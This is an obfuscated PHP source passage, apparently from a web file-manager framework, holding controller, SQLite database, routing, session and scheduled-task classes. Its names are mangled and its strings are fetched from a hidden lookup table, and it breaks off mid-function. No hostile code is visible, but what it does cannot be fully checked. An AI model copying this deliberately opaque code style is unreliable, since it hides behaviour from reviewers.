<?php
 goto aº˜Ä¸ãî; d´ê¾Æ…’Ã: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ƒ§ óã =& $_SERVER[ú‡®¯¨±]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ƒ§ óã[6]] =& $config; $this->values[$ƒ§ óã[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ƒ§ óã[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($­£ç¥æŒ) { if (1 === func_num_args()) { $this->{$­£ç¥æŒ} = new $­£ç¥æŒ(); } else { $ûÃ¿€ƒó = new ReflectionClass($­£ç¥æŒ); $ëé´÷Ş = func_get_args(); array_shift($ëé´÷Ş); $this->{$­£ç¥æŒ} = $ûÃ¿€ƒó->newInstanceArgs($ëé´÷Ş); } return $this->{$­£ç¥æŒ}; } public function routeBind($èâéÊíø, $ öÊˆš, $ŠÃ‚•ÊÙ = 3) { $«Õ­ÈíÀ =& $_SERVER[ú‡®¯¨±]; $ÆæÊøöú = $this->in[$«Õ­ÈíÀ[9]]; $èâéÊíø = str_replace($«Õ­ÈíÀ[10], $«Õ­ÈíÀ[11], trim(trim($èâéÊíø, $«Õ­ÈíÀ[8]), $«Õ­ÈíÀ[12])); if (!$èâéÊíø || count($ÆæÊøöú) <= $ŠÃ‚•ÊÙ) { return !1; } $ÇæÔ¶™© = !0; $·Ù÷ò”Ò = explode($«Õ­ÈíÀ[8], $èâéÊíø); for ($ ïòåß“ = 0; $ ïòåß“ < count($·Ù÷ò”Ò); $ ïòåß“++) { if ($·Ù÷ò”Ò[$ ïòåß“] != $ÆæÊøöú[$ŠÃ‚•ÊÙ + $ ïòåß“]) { $ÇæÔ¶™© = !1; break; } } if (!$ÇæÔ¶™©) { return; } call_user_func_array(array($this, $ öÊˆš), array()); } public function routeArgs($ªù»ÌÓ = 3) { $Û²í°… = $this->in[$_SERVER[ú‡®¯¨±][9]]; if (count($Û²í°…) <= $ªù»ÌÓ) { return array(); } $”–¬·í¡ = array(); for ($íñ»ÊÏ = $ªù»ÌÓ; $íñ»ÊÏ < count($Û²í°…); $íñ»ÊÏ += 2) { $”–¬·í¡[$Û²í°…[$íñ»ÊÏ]] = $Û²í°…[$íñ»ÊÏ + 1]; $this->in[$Û²í°…[$íñ»ÊÏ]] = $Û²í°…[$íñ»ÊÏ + 1]; } return $”–¬·í¡; } protected function assign($½ª™ËØ, $ˆá»şğ•) { $this->values[$½ª™ËØ] = $ˆá»şğ•; } protected function display($ĞÛÎÀ¡) { ob_end_clean(); extract($this->values); require $this->tpl . $ĞÛÎÀ¡; } } class DbSqliteBase extends Db { public function __construct($ŸÓÂ÷ƒı = '') { $Æ™ñ¿ƒÈ =& $_SERVER[ú‡®¯¨±]; if (!extension_loaded($Æ™ñ¿ƒÈ[13])) { think_exception(think_lang($Æ™ñ¿ƒÈ[14]) . $Æ™ñ¿ƒÈ[15]); } if (!empty($ŸÓÂ÷ƒı)) { if (!isset($ŸÓÂ÷ƒı[$Æ™ñ¿ƒÈ[16]])) { $ŸÓÂ÷ƒı[$Æ™ñ¿ƒÈ[16]] = 438; } $this->config = $ŸÓÂ÷ƒı; if (empty($this->config[$Æ™ñ¿ƒÈ[17]])) { $this->config[$Æ™ñ¿ƒÈ[17]] = array(); } } } public function connect($õÁè…Ô¤ = '', $¹Ìğ­ö§ = 0) { $¨†à’Ñæ =& $_SERVER[ú‡®¯¨±]; if (!isset($this->linkID[$¹Ìğ­ö§])) { if (empty($õÁè…Ô¤)) { $õÁè…Ô¤ = $this->config; } $ÍŒó«÷÷ = !empty($õÁè…Ô¤[$¨†à’Ñæ[17]][$¨†à’Ñæ[18]]) ? $õÁè…Ô¤[$¨†à’Ñæ[17]][$¨†à’Ñæ[18]] : $this->pconnect; $Ú’ƒä´¡ = $ÍŒó«÷÷ ? $¨†à’Ñæ[19] : $¨†à’Ñæ[20]; $this->linkID[$¹Ìğ­ö§] = $Ú’ƒä´¡($õÁè…Ô¤[$¨†à’Ñæ[21]], $õÁè…Ô¤[$¨†à’Ñæ[16]]); if (!$this->linkID[$¹Ìğ­ö§]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$¹Ìğ­ö§], 30000); if (1 != think_config($¨†à’Ñæ[22])) { unset($this->config); } } return $this->linkID[$¹Ìğ­ö§]; } public function free() { $this->queryID = null; } public function query($¶ãÑÉæü) { $ÛãÌ£º¦ =& $_SERVER[ú‡®¯¨±]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¶ãÑÉæü; if ($this->queryID) { $this->free(); } think_action_status($ÛãÌ£º¦[23], 1); think_status($ÛãÌ£º¦[24]); $this->queryID = sqlite_query($this->_linkID, $¶ãÑÉæü); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ÂÃõ–ÌŒ = $this->getAll(); return $ÂÃõ–ÌŒ; } } public function execute($§Õ¨©ò) { $ ºşñé =& $_SERVER[ú‡®¯¨±]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $§Õ¨©ò; if ($this->queryID) { $this->free(); } think_action_status($ ºşñé[25], 1); think_status($ ºşñé[24]); $²Â¢¡æó = sqlite_exec($this->_linkID, $§Õ¨©ò); $this->debug(); if (!1 === $²Â¢¡æó) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ú‡®¯¨±][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ş˜‰ï£ = sqlite_query($this->_linkID, $_SERVER[ú‡®¯¨±][27]); if (!$Ş˜‰ï£) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¨õıÇ´® = sqlite_query($this->_linkID, $_SERVER[ú‡®¯¨±][28]); if (!$¨õıÇ´®) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ùİÃ‡– = array(); if ($this->numRows > 0) { for ($ì‚¢ïÍ = 0; $ì‚¢ïÍ < $this->numRows; $ì‚¢ïÍ++) { $ùİÃ‡–[$ì‚¢ïÍ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ùİÃ‡–; } public function getFields($­Ù®®Ş) { $€…—÷İ§ =& $_SERVER[ú‡®¯¨±]; $É®ğÂ´ = $this->query($€…—÷İ§[29] . $­Ù®®Ş . $€…—÷İ§[30]); $Á‰¥…Ñà = array(); if ($É®ğÂ´) { foreach ($É®ğÂ´ as $±ŞÍğ¥÷ => $™íæÇÇà) { $Á‰¥…Ñà[$™íæÇÇà[$€…—÷İ§[31]]] = array($€…—÷İ§[32] => $™íæÇÇà[$€…—÷İ§[31]], $€…—÷İ§[33] => $™íæÇÇà[$€…—÷İ§[34]], $€…—÷İ§[35] => (bool) ($™íæÇÇà[$€…—÷İ§[36]] === $€…—÷İ§[12]), $€…—÷İ§[37] => $™íæÇÇà[$€…—÷İ§[38]], $€…—÷İ§[39] => strtolower($™íæÇÇà[$€…—÷İ§[40]]) == $€…—÷İ§[41], $€…—÷İ§[42] => strtolower($™íæÇÇà[$€…—÷İ§[43]]) == $€…—÷İ§[44]); } } return $Á‰¥…Ñà; } public function getTables($¸É¹ú¤Ñ = '') { $Õˆ™¹ì‡ =& $_SERVER[ú‡®¯¨±]; $øº¡¬â¶ = $this->query($Õˆ™¹ì‡[45] . $Õˆ™¹ì‡[46] . $Õˆ™¹ì‡[47]); $¯¬õÌ = array(); foreach ($øº¡¬â¶ as $ÈıäàÏ¤ => $İøß¥Å) { $¯¬õÌ[$ÈıäàÏ¤] = current($İøß¥Å); } return $¯¬õÌ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ë÷Ù÷“ü =& $_SERVER[ú‡®¯¨±]; $™úø›Ù = sqlite_last_error($this->_linkID); $this->error = $™úø›Ù . $Ë÷Ù÷“ü[4] . sqlite_error_string($™úø›Ù); if ($Ë÷Ù÷“ü[12] != $this->queryStr) { $this->error .= LNG($Ë÷Ù÷“ü[48]) . $this->queryStr; } think_trace($this->error, $Ë÷Ù÷“ü[12], $Ë÷Ù÷“ü[49]); return $this->error; } public function escapeString($°µ¶ÎÈÌ) { return sqlite_escape_string($°µ¶ÎÈÌ); } public function parseLimit($¹ª’¾ô¥) { $á¢©š– =& $_SERVER[ú‡®¯¨±]; $ÎÇ² = $á¢©š–[12]; if (!empty($¹ª’¾ô¥)) { $¹ª’¾ô¥ = explode($á¢©š–[50], $¹ª’¾ô¥); if (count($¹ª’¾ô¥) > 1) { $ÎÇ² .= $á¢©š–[51] . $¹ª’¾ô¥[1] . $á¢©š–[52] . $¹ª’¾ô¥[0] . $á¢©š–[53]; } else { $ÎÇ² .= $á¢©š–[51] . $¹ª’¾ô¥[0] . $á¢©š–[53]; } } return $ÎÇ²; } } class DbSqlite3Base extends Db { public function __construct($è€°’Ù† = '') { $”äïæ¿€ =& $_SERVER[ú‡®¯¨±]; if (!class_exists($”äïæ¿€[54])) { think_exception(think_lang($”äïæ¿€[14]) . $”äïæ¿€[55]); } if (!empty($è€°’Ù†)) { if (!isset($è€°’Ù†[$”äïæ¿€[16]])) { $è€°’Ù†[$”äïæ¿€[16]] = 438; } $this->config = $è€°’Ù†; if (empty($this->config[$”äïæ¿€[17]])) { $this->config[$”äïæ¿€[17]] = array(); } } } public function connect($Áä•²ƒĞ = '', $èÒ½ò²ì = 0) { $øà©ş³è =& $_SERVER[ú‡®¯¨±]; if (!isset($this->linkID[$èÒ½ò²ì])) { if (empty($Áä•²ƒĞ)) { $Áä•²ƒĞ = $this->config; } $this->linkID[$èÒ½ò²ì] = new SQLite3($Áä•²ƒĞ[$øà©ş³è[21]]); if (!$this->linkID[$èÒ½ò²ì]) { think_exception($this->linkID[$èÒ½ò²ì]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$èÒ½ò²ì]->busyTimeout(30000); if (1 != think_config($øà©ş³è[22])) { unset($this->config); } } return $this->linkID[$èÒ½ò²ì]; } public function free() { $this->queryID = null; } public function query($Åª¤çµñ) { $¥éÇ‘Àò =& $_SERVER[ú‡®¯¨±]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Åª¤çµñ; if ($this->queryID) { $this->free(); } think_action_status($¥éÇ‘Àò[23], 1); think_status($¥éÇ‘Àò[24]); $this->queryID = $this->_linkID->query($Åª¤çµñ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $²¡ºì©’ = $this->getAll(); $this->numRows = count($²¡ºì©’); return $²¡ºì©’; } } public function execute($âş®œÆ) { $Ùå¥¬ë¾ =& $_SERVER[ú‡®¯¨±]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $âş®œÆ; if ($this->queryID) { $this->free(); } think_action_status($Ùå¥¬ë¾[25], 1); think_status($Ùå¥¬ë¾[24]); $Ç÷ŒŠ› = $this->_linkID->exec($âş®œÆ); $this->debug(); if (!1 === $Ç÷ŒŠ›) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ú‡®¯¨±][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¾ĞœÇú = $this->_linkID->query($_SERVER[ú‡®¯¨±][27]); if (!$¾ĞœÇú) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $£ì€ï§Ú = $this->_linkID->query($_SERVER[ú‡®¯¨±][28]); if (!$£ì€ï§Ú) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ó’¾ó‚ = array(); while ($äëÍí¦Ğ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ó’¾ó‚[] = $äëÍí¦Ğ; } $this->queryID->reset(); return $ó’¾ó‚; } public function getFields($øòÜŠµŒ) { $™«§ÑÚ± =& $_SERVER[ú‡®¯¨±]; $Üè©óË† = $this->query($™«§ÑÚ±[29] . $øòÜŠµŒ . $™«§ÑÚ±[30]); $›»’Ï = array(); if ($Üè©óË†) { foreach ($Üè©óË† as $ÕÉìîÇ => $ÏÇ˜¤–ù) { $›»’Ï[$ÏÇ˜¤–ù[$™«§ÑÚ±[32]]] = array($™«§ÑÚ±[32] => $ÏÇ˜¤–ù[$™«§ÑÚ±[32]], $™«§ÑÚ±[33] => $ÏÇ˜¤–ù[$™«§ÑÚ±[33]], $™«§ÑÚ±[35] => (bool) ($ÏÇ˜¤–ù[$™«§ÑÚ±[35]] === $™«§ÑÚ±[12]), $™«§ÑÚ±[37] => $ÏÇ˜¤–ù[$™«§ÑÚ±[56]], $™«§ÑÚ±[39] => (bool) $ÏÇ˜¤–ù[$™«§ÑÚ±[57]], $™«§ÑÚ±[42] => (bool) $ÏÇ˜¤–ù[$™«§ÑÚ±[57]]); } } return $›»’Ï; } public function getTables($Í—×ÏšÙ = '') { $™øóµÔ =& $_SERVER[ú‡®¯¨±]; $ØºÁ…¾Ë = $this->query($™øóµÔ[45] . $™øóµÔ[46] . $™øóµÔ[47]); $ğŸ“¶¡û = array(); foreach ($ØºÁ…¾Ë as $Ö Ï•¢£ => $—üÅ‡”ß) { $ğŸ“¶¡û[$Ö Ï•¢£] = current($—üÅ‡”ß); } return $ğŸ“¶¡û; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Æó‡¢ë =& $_SERVER[ú‡®¯¨±]; $this->error = $this->_linkID->lastErrorMsg(); if ($Æó‡¢ë[12] != $this->queryStr) { $this->error .= LNG($Æó‡¢ë[48]) . $this->queryStr; } think_trace($this->error, $Æó‡¢ë[12], $Æó‡¢ë[49]); return $this->error; } public function escapeString($’˜ÌÙ) { $ÆÛê¾ªŸ =& $_SERVER[ú‡®¯¨±]; if ($this->_linkID) { return $this->_linkID->escapeString($’˜ÌÙ); } return str_ireplace($ÆÛê¾ªŸ[58], $ÆÛê¾ªŸ[59], $’˜ÌÙ); } public function parseLimit($şšışæ) { $ÜÉŒ·€Ï =& $_SERVER[ú‡®¯¨±]; $¦å¢×¡Ì = $ÜÉŒ·€Ï[12]; if (!empty($şšışæ)) { $şšışæ = explode($ÜÉŒ·€Ï[50], $şšışæ); if (count($şšışæ) > 1) { $¦å¢×¡Ì .= $ÜÉŒ·€Ï[51] . $şšışæ[1] . $ÜÉŒ·€Ï[52] . $şšışæ[0] . $ÜÉŒ·€Ï[53]; } else { $¦å¢×¡Ì .= $ÜÉŒ·€Ï[51] . $şšışæ[0] . $ÜÉŒ·€Ï[53]; } } return $¦å¢×¡Ì; } } goto D‚ˆİ©ÚÁ¬; d·‘µù’×º: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\156\x79" => "\133\136\57\x5d\53", "\x3a\x6e\165\x6d" => "\133\60\x2d\x39\135\x2b", "\72\141\x6c\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($”‡éëª†, $›‡ÁÚˆ) { $ÔÜ£»‚æ =& $_SERVER[ú‡®¯¨±]; if ($”‡éëª† == $ÔÜ£»‚æ[1644]) { $Ñï±°„ = array_map($ÔÜ£»‚æ[1645], $›‡ÁÚˆ[0]); $²»è = strpos($›‡ÁÚˆ[1], $ÔÜ£»‚æ[8]) === 0 ? $›‡ÁÚˆ[1] : $ÔÜ£»‚æ[8] . $›‡ÁÚˆ[1]; $¥á·ÕÖ× = $›‡ÁÚˆ[2]; } else { $Ñï±°„ = null; $²»è = strpos($›‡ÁÚˆ[0], $ÔÜ£»‚æ[8]) === 0 ? $›‡ÁÚˆ[0] : $ÔÜ£»‚æ[8] . $›‡ÁÚˆ[0]; $¥á·ÕÖ× = $›‡ÁÚˆ[1]; } array_push(self::$maps, $Ñï±°„); array_push(self::$routes, $²»è); array_push(self::$methods, strtoupper($”‡éëª†)); array_push(self::$callbacks, $¥á·ÕÖ×); } public static function error($é’Éªˆ) { self::$errorCallback = $é’Éªˆ; } public static function haltOnMatch($âîø¥ª = true) { self::$halts = $âîø¥ª; } public static function dispatch() { $ºòûªİî =& $_SERVER[ú‡®¯¨±]; $ÑŠÑÓ„Ú = parse_url($_SERVER[$ºòûªİî[1646]], PHP_URL_PATH); $»„Â˜‡‰ = $_SERVER[$ºòûªİî[162]]; $ „éµüÀ = array_keys(static::$patterns); $Ü¤ùÍî€ = array_values(static::$patterns); $ÎâÓµŠ¦ = !1; self::$routes = preg_replace($ºòûªİî[1332], $ºòûªİî[8], self::$routes); if (in_array($ÑŠÑÓ„Ú, self::$routes)) { $¦±Û¶è÷ = array_keys(self::$routes, $ÑŠÑÓ„Ú); foreach ($¦±Û¶è÷ as $ƒùÂëªÄ) { if (self::$methods[$ƒùÂëªÄ] == $»„Â˜‡‰ || self::$methods[$ƒùÂëªÄ] == $ºòûªİî[1647] || in_array($»„Â˜‡‰, self::$maps[$ƒùÂëªÄ])) { $ÎâÓµŠ¦ = !0; if (!is_object(self::$callbacks[$ƒùÂëªÄ])) { $É˜‚“Ñï = explode($ºòûªİî[8], self::$callbacks[$ƒùÂëªÄ]); $³ùÅÓ±€ = end($É˜‚“Ñï); $‘ Õ¥’“ = explode($ºòûªİî[1264], $³ùÅÓ±€); $õ±–÷Ÿè = new $‘ Õ¥’“[0](); $õ±–÷Ÿè->{$‘ Õ¥’“[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ƒùÂëªÄ]); if (self::$halts) { return; } } } } } else { $İĞĞûÓ = 0; foreach (self::$routes as $ƒùÂëªÄ) { if (strpos($ƒùÂëªÄ, $ºòûªİî[4]) !== !1) { $ƒùÂëªÄ = str_replace($ „éµüÀ, $Ü¤ùÍî€, $ƒùÂëªÄ); } if (preg_match($ºòûªİî[1648] . $ƒùÂëªÄ . $ºòûªİî[1649], $ÑŠÑÓ„Ú, $Ä³ø°Ûß)) { if (self::$methods[$İĞĞûÓ] == $»„Â˜‡‰ || self::$methods[$İĞĞûÓ] == $ºòûªİî[1647] || !empty(self::$maps[$İĞĞûÓ]) && in_array($»„Â˜‡‰, self::$maps[$İĞĞûÓ])) { $ÎâÓµŠ¦ = !0; array_shift($Ä³ø°Ûß); if (!is_object(self::$callbacks[$İĞĞûÓ])) { $É˜‚“Ñï = explode($ºòûªİî[8], self::$callbacks[$İĞĞûÓ]); $³ùÅÓ±€ = end($É˜‚“Ñï); $‘ Õ¥’“ = explode($ºòûªİî[1264], $³ùÅÓ±€); $õ±–÷Ÿè = new $‘ Õ¥’“[0](); if (!method_exists($õ±–÷Ÿè, $‘ Õ¥’“[1])) { echo $ºòûªİî[1650]; } else { call_user_func_array(array($õ±–÷Ÿè, $‘ Õ¥’“[1]), $Ä³ø°Ûß); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$İĞĞûÓ], $Ä³ø°Ûß); if (self::$halts) { return; } } } } $İĞĞûÓ++; } } if ($ÎâÓµŠ¦ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $º¯Åß°Ä =& $_SERVER[ú‡®¯¨±]; header($_SERVER[$º¯Åß°Ä[1651]] . $º¯Åß°Ä[1652]); echo $º¯Åß°Ä[1653]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ºòûªİî[1646]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $÷ßä‡Ø– =& $_SERVER[ú‡®¯¨±]; static $ı’¡Ë˜ù = false; if ($ı’¡Ë˜ù) { return $ı’¡Ë˜ù; } $˜íù˜© = $GLOBALS[$÷ßä‡Ø–[6]][$÷ßä‡Ø–[404]]; self::$sessionTime = $˜íù˜©[$÷ßä‡Ø–[1654]]; $Õ÷Çˆâ¯ = isset($GLOBALS[$÷ßä‡Ø–[1655]]) ? $GLOBALS[$÷ßä‡Ø–[1655]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($Õ÷Çˆâ¯)) { self::$sessionSign = Cookie::get($Õ÷Çˆâ¯); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($Õ÷Çˆâ¯, self::$sessionSign, self::$sessionTime); $ì¢œˆü = $˜íù˜©[$÷ßä‡Ø–[1656]]; $»ƒ®´²ˆ = $˜íù˜©[$ì¢œˆü]; $Ï²ë“Ù = $˜íù˜©[$÷ßä‡Ø–[883]]; switch ($ì¢œˆü) { case $÷ßä‡Ø–[21]: self::$handle = Model($÷ßä‡Ø–[884]); break; case $÷ßä‡Ø–[885]: self::$handle = new CacheRedis($»ƒ®´²ˆ, $Ï²ë“Ù); break; case $÷ßä‡Ø–[886]: self::$handle = new CacheMemcached($»ƒ®´²ˆ, $Ï²ë“Ù); break; case $÷ßä‡Ø–[226]: $»ƒ®´²ˆ[$÷ßä‡Ø–[86]] = $»ƒ®´²ˆ[$÷ßä‡Ø–[86]] . $÷ßä‡Ø–[1657]; self::$handle = new CacheFile($»ƒ®´²ˆ, $Ï²ë“Ù); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ı’¡Ë˜ù = new self(); return $ı’¡Ë˜ù; } public static function getBySign($íÜ“¹) { $½Ò¿ºÇ = self::$handle->get($íÜ“¹); $½Ò¿ºÇ = unserialize($½Ò¿ºÇ); return is_array($½Ò¿ºÇ) ? $½Ò¿ºÇ : array(); } public static function setBySign($ôš½æ›ü, $Úï…÷©“) { CacheLock::lock($ôš½æ›ü); self::$handle->set($ôš½æ›ü, serialize($Úï…÷©“), self::$sessionTime); CacheLock::unlock($ôš½æ›ü); } public static function sign($Í†ô´²‡ = false) { if ($Í†ô´²‡) { self::$sessionSign = $Í†ô´²‡; } self::init(); return self::$sessionSign; } public static function set($™Üµæàõ, $¢Ğš€¯ñ = false) { self::init(); if (is_array($™Üµæàõ)) { foreach ($™Üµæàõ as $˜û‘ŸñÆ => $ùõ©°ÒÎ) { array_set_value(self::$data, $˜û‘ŸñÆ, $ùõ©°ÒÎ); } } else { array_set_value(self::$data, $™Üµæàõ, $¢Ğš€¯ñ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($Şºôœ„± = false) { self::init(); if (!$Şºôœ„±) { return self::$data; } return array_get_value(self::$data, $Şºôœ„±); } public static function remove($­è•Ú§) { self::init(); unset(self::$data[$­è•Ú§]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ú‡®¯¨±][889])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $âÌ–¿¶ =& $_SERVER[ú‡®¯¨±]; if (self::valueGet($âÌ–¿¶[805]) != $âÌ–¿¶[90]) { return; } if (self::valueGet($âÌ–¿¶[1658]) == $âÌ–¿¶[90]) { $ÄÙéÈÆç = self::valueGet($âÌ–¿¶[1659]); if (time() - $ÄÙéÈÆç > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($âÌ–¿¶[1658], $âÌ–¿¶[90]); self::log($âÌ–¿¶[1660] . ACTION . $âÌ–¿¶[1661]); Hook::bind($âÌ–¿¶[1662], $âÌ–¿¶[1663]); $ĞâšÊğ = 0; while (!0) { self::cacheClear(); if (self::valueGet($âÌ–¿¶[805]) != $âÌ–¿¶[90]) { self::valueSet($âÌ–¿¶[1658], $âÌ–¿¶[224]); self::log($âÌ–¿¶[1664]); die; } $üÄ€°œ = time(); if ($üÄ€°œ - $ĞâšÊğ >= 60) { self::valueSet(array($âÌ–¿¶[1658] => $âÌ–¿¶[90], $âÌ–¿¶[1659] => $üÄ€°œ)); $ĞâšÊğ = $üÄ€°œ; } if (!file_exists(USER_SYSTEM . $âÌ–¿¶[1665])) { self::valueSet(array($âÌ–¿¶[1658] => $âÌ–¿¶[224], $âÌ–¿¶[805] => $âÌ–¿¶[224])); self::log($âÌ–¿¶[1666]); die; } $õ“Ã©ç = file_get_contents(BASIC_PATH . $âÌ–¿¶[1667]); $± ›‰ÖË = KOD_VERSION . $âÌ–¿¶[10] . KOD_VERSION_BUILD; $¦ÄÖ’§Ú = match_text($õ“Ã©ç, $âÌ–¿¶[1668]) . $âÌ–¿¶[10] . match_text($õ“Ã©ç, $âÌ–¿¶[1669]); if ($¦ÄÖ’§Ú != $± ›‰ÖË) { self::restart(); self::log("\x73\164\157\x70\x65\144\56\133\166\145\162\163\x69\x6f\x6e\40\x75\x70\144\x61\x74\x65\73{$versionNow}\x20\x3d\x3e\40{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $¦°à¨¶ =& $_SERVER[ú‡®¯¨±]; http_close(); $GLOBALS[$¦°à¨¶[1670]] = 1; $_SERVER[$¦°à¨¶[1671]] = $¦°à¨¶[1672]; $_COOKIE = array(); $GLOBALS[$¦°à¨¶[1673]] = 1; $GLOBALS[$¦°à¨¶[1674]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $ñÖãö¦ã =& $_SERVER[ú‡®¯¨±]; http_close(); self::valueSet($ñÖãö¦ã[805], $ñÖãö¦ã[224]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ñÖãö¦ã[1658] => $ñÖãö¦ã[224], $ñÖãö¦ã[805] => $ñÖãö¦ã[90])); self::log($ñÖãö¦ã[1675]); } public static function taskSwitch() { $•Ğ®ğ¯ˆ =& $_SERVER[ú‡®¯¨±]; $ûñß„µş = self::valueGet($•Ğ®ğ¯ˆ[805]) == $•Ğ®ğ¯ˆ[90] ? $•Ğ®ğ¯ˆ[224] : $•Ğ®ğ¯ˆ[90]; self::valueSet($•Ğ®ğ¯ˆ[805], $ûñß„µş); } public static function shutdownEvent() { $°Ñü»õ =& $_SERVER[ú‡®¯¨±]; self::valueSet($°Ñü»õ[1658], $°Ñü»õ[224]); self::log($°Ñü»õ[1676]); } public static function config($‚Ü±¼Ñ , $‡æâáºë) { self::valueSet($_SERVER[ú‡®¯¨±][805], $‚Ü±¼Ñ ); } private static function taskRunAll() { $öÀ§úéè =& $_SERVER[ú‡®¯¨±]; $İ‡óÄ‡÷ = timeFloat(); $Ë‹çŒ¨ = Model($öÀ§úéè[1677])->listData(); $‡—‚èÈè = count($Ë‹çŒ¨); for ($ÑëŠƒº¼ = 0; $ÑëŠƒº¼ < $‡—‚èÈè; $ÑëŠƒº¼++) { $”†’»İ° = $Ë‹çŒ¨[$ÑëŠƒº¼]; if (!$”†’»İ°[$öÀ§úéè[453]] || $”†’»İ°[$öÀ§úéè[1678]] != $öÀ§úéè[90]) { continue; } if (!self::taskTimeCheck($”†’»İ°)) { continue; } self::taskRun($”†’»İ°); } Hook::trigger($öÀ§úéè[1679]); self::taskQueueRun($İ‡óÄ‡÷); } private static function taskQueueRun($şèÍóî) { $¦ûœÌ = 10; while (!0) { $ò¤¿†š¬ = TaskQueue::run(); if ($ò¤¿†š¬ === !1) { break; } if (timeFloat() - $şèÍóî >= $¦ûœÌ) { break; } } } private static function taskTimeCheck($˜åó¥„½) { $àËÚßñ¦ =& $_SERVER[ú‡®¯¨±]; $å¹¥öÆÏ = json_decode($˜åó¥„½[$àËÚßñ¦[196]], !0); $ÂÃã’õÖ = intval($˜åó¥„½[$àËÚßñ¦[1659]]); $ÁîÄ¹­© = strtotime($àËÚßñ¦[1680] . $å¹¥öÆÏ[$àËÚßñ¦[1681]] . $àËÚßñ¦[1682]) - strtotime($àËÚßñ¦[1683]); $ìéÈş = time() - strtotime(date($àËÚßñ¦[1684]) . $àËÚßñ¦[1685]); $ô³›–¹ = $ìéÈş >= $ÁîÄ¹­© && $ìéÈş <= $ÁîÄ¹­© + 3600; switch ($å¹¥öÆÏ[$àËÚßñ¦[33]]) { case $àËÚßñ¦[1686]: if (time() - $ÂÃã’õÖ < 3600 * 24 * 30) { return !1; } if ($å¹¥öÆÏ[$àËÚßñ¦[1686]] == date($àËÚßñ¦[1687]) && $ô³›–¹) { return !0; } break; case $àËÚßñ¦[1688]: if (time() - $ÂÃã’õÖ < 3600 * 24 * 7) { return !1; } $¯²È½Ë‘ = date($àËÚßñ¦[1689]) == 0 ? 7 : date($àËÚßñ¦[1689]); if ($å¹¥öÆÏ[$àËÚßñ¦[1688]] == $¯²È½Ë‘ && $ô³›–¹) { return !0; } break; case $àËÚßñ¦[1681]: if (time() - $ÂÃã’õÖ < 3600 * 24) { return !1; } if ($ô³›–¹) { return !0; } break; case $àËÚßñ¦[1690]: if (time() - $ÂÃã’õÖ >= floatval($å¹¥öÆÏ[$àËÚßñ¦[1690]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $“¾œÍè© =& $_SERVER[ú‡®¯¨±]; static $îÊ©Ôª = 0; $øŒìî÷Á = 300; if (!$îÊ©Ôª) { $îÊ©Ôª = time(); } if (time() - $îÊ©Ôª < $øŒìî÷Á) { return; } $îÊ©Ôª = time(); $©áÅ…‡ı = Model($“¾œÍè©[556])->db($“¾œÍè©[12]); if ($©áÅ…‡ı) { 